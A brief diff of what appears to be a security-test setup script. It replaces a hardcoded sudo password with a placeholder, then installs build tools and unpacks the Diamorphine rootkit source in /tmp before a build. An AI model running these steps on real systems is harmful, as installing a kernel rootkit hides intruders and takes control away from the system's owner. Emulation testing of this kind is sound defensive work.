@@ -1,6 +1,6 @@
 Elevation Required;
 #pre
-echo "010404grz" | sudo -S sh -c '((which yum && sudo yum -y install zip gcc make) || (which apt-get && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y zip gcc make))'
+echo "%password%" | sudo -S sh -c '((which yum && sudo yum -y install zip gcc make) || (which apt-get && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y zip gcc make))'
 cd /tmp
 unzip Diamorphine-master.zip
 cd Diamorphine-master
